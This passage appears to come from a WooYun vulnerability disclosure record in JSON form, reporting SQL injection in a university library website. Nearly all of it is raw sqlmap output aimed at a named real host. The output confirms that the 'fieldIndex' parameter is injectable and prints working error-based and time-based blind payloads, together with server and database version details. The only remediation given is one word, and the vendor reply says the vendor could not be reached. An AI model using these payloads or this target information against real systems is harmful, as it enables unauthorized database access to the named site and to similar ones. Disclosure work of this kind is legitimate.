HAVING clause'[10:44:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[10:44:17] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[10:44:18] [INFO] testing 'MySQL inline queries'[10:44:18] [INFO] testing 'PostgreSQL inline queries'[10:44:18] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[10:44:18] [INFO] testing 'Oracle inline queries'[10:44:18] [INFO] testing 'SQLite inline queries'[10:44:18] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:44:19] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[10:44:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[10:44:21] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:44:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[10:44:23] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[10:44:24] [INFO] testing 'Oracle AND time-based blind'[10:44:25] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[10:44:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[10:44:40] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option '--dbms'[10:44:54] [WARNING] GET parameter 'typeIndex' is not injectable[10:44:54] [INFO] testing if GET parameter 'fieldIndex' is dynamic[10:44:54] [INFO] confirming that GET parameter 'fieldIndex' is dynamic[10:44:54] [WARNING] GET parameter 'fieldIndex' does not appear dynamic[10:44:54] [INFO] heuristic (basic) test shows that GET parameter 'fieldIndex' might be injectable (possible DBMS: 'MySQL')[10:44:54] [INFO] testing for SQL injection on GET parameter 'fieldIndex'heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do youwant to skip test payloads specific for other DBMSes? [Y/n] ydo you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] y[10:45:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:45:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:45:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:45:13] [WARNING] reflective value(s) found and filtering out[10:45:14] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'[10:45:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'[10:45:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT -original value)'[10:45:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'[10:45:18] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace(original value)'[10:45:18] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'[10:45:19] [INFO] testing 'MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'[10:45:19] [INFO] testing 'MySQL < 5.0 boolean-based blind - GROUP BY and ORDERBY clauses'[10:45:20] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:45:20] [INFO] GET parameter 'fieldIndex' is 'MySQL >= 5.0 AND error-based -WHERE or HAVING clause' injectable[10:45:20] [INFO] testing 'MySQL inline queries'[10:45:20] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:45:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[10:45:20] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:45:20] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (comment)'[10:45:21] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'[10:46:03] [INFO] GET parameter 'fieldIndex' is 'MySQL < 5.0.12 AND time-based blind (heavy query)' injectable[10:46:03] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[10:46:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[10:46:08] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'[10:46:12] [INFO] testing 'MySQL UNION query (NULL) - 22 to 40 columns'[10:46:16] [INFO] testing 'MySQL UNION query (random number) - 22 to 40 columns'[10:46:20] [INFO] testing 'MySQL UNION query (NULL) - 42 to 60 columns'[10:46:27] [INFO] testing 'MySQL UNION query (random number) - 42 to 60 columns'[10:46:31] [INFO] testing 'MySQL UNION query (NULL) - 62 to 80 columns'[10:46:36] [INFO] testing 'MySQL UNION query (random number) - 62 to 80 columns'[10:46:40] [INFO] testing 'MySQL UNION query (NULL) - 82 to 100 columns'[10:46:44] [INFO] testing 'MySQL UNION query (random number) - 82 to 100 columns'[10:46:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'GET parameter 'fieldIndex' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y[10:47:06] [INFO] testing if GET parameter 'keywordFir' is dynamic[10:47:07] [WARNING] GET parameter 'keywordFir' does not appear dynamic[10:47:08] [WARNING] heuristic (basic) test shows that GET parameter 'keywordFir' might not be injectable[10:47:08] [INFO] testing for SQL injection on GET parameter 'keywordFir'[10:47:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:47:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:47:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:47:28] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'[10:47:35] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'[10:47:36] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT -original value)'[10:47:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'[10:47:39] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace(original value)'[10:47:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'[10:47:41] [INFO] testing 'MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'[10:47:42] [INFO] testing 'MySQL < 5.0 boolean-based blind - GROUP BY and ORDERBY clauses'[10:47:44] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:47:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)'[10:47:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)'[10:47:54] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'[10:47:57] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause'[10:48:00] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause(EXTRACTVALUE)'[10:48:04] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause(UPDATEXML)'[10:48:07] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause'[10:48:11] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'[10:48:14] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[10:48:17] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'[10:48:18] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'[10:48:19] [INFO] testing 'MySQL >= 5.0 error-based - GROUP BY and ORDER BY clauses'[10:48:19] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)'[10:48:20] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)'[10:48:21] [INFO] testing 'MySQL inline queries'[10:48:21] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:48:25] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[10:48:31] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:48:34] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (comment)'[10:48:37] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'[10:48:41] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'[10:48:44] [INFO] testing 'MySQL > 5.0.11 OR time-based blind'[10:48:47] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'[10:48:50] [INFO] testing 'MySQL >= 5.0 time-based blind - Parameter replace'[10:48:51] [INFO] testing 'MySQL < 5.0 time-based blind - Parameter replace (heavy queries)'[10:48:51] [INFO] testing 'MySQL time-based blind - Parameter replace (bool*int)'[10:48:52] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'[10:48:52] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'[10:48:53] [INFO] testing 'MySQL >= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses'[10:48:54] [INFO] testing 'MySQL < 5.0.12 time-based blind - GROUP BY and ORDERBY clauses (heavy query)'[10:48:54] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[10:49:30] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'[10:50:12] [INFO] testing 'MySQL UNION query (NULL) - 11 to 20 columns'[10:50:49] [INFO] testing 'MySQL UNION query (random number) - 11 to 20 columns'[10:51:39] [INFO] testing 'MySQL UNION query (NULL) - 21 to 30 columns'[10:52:13] [INFO] testing 'MySQL UNION query (random number) - 21 to 30 columns'[10:52:49] [INFO] testing 'MySQL UNION query (NULL) - 31 to 40 columns'[10:53:22] [INFO] testing 'MySQL UNION query (random number) - 31 to 40 columns'[10:54:00] [INFO] testing 'MySQL UNION query (NULL) - 41 to 50 columns'[10:54:33] [INFO] testing 'MySQL UNION query (random number) - 41 to 50 columns'[10:55:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[10:55:45] [WARNING] GET parameter 'keywordFir' is not injectablesqlmap identified the following injection points with a total of 1183 HTTP(s) requests:---Place: GETParameter: fieldIndex    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: typeIndex=&fieldIndex=z_class) AND (SELECT 9858 FROM(SELECT COUNT(*),CONCAT(0x7162796d71,(SELECT (CASE WHEN (9858=9858) THEN 1 ELSE 0 END)),0x7173677a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (5293=5293&keywordFir=TP391.41/3988    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: typeIndex=&fieldIndex=z_class) AND 6755=BENCHMARK(5000000,MD5(0x6a596d72)) AND (8159=8159&keywordFir=TP391.41/3988---[10:55:45] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.4.10back-end DBMS: MySQL 5.0[10:55:45] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 464 times[10:55:45] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[10:55:45] [INFO] fetched data logged to text files under 'E:\\SQL?~1\\SQLMAP~1.4\\Bin\\output\\cd.lib.njit.edu.cn'[*] shutting down at 10:55:45[root@Hacker~]# Sqlmap\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}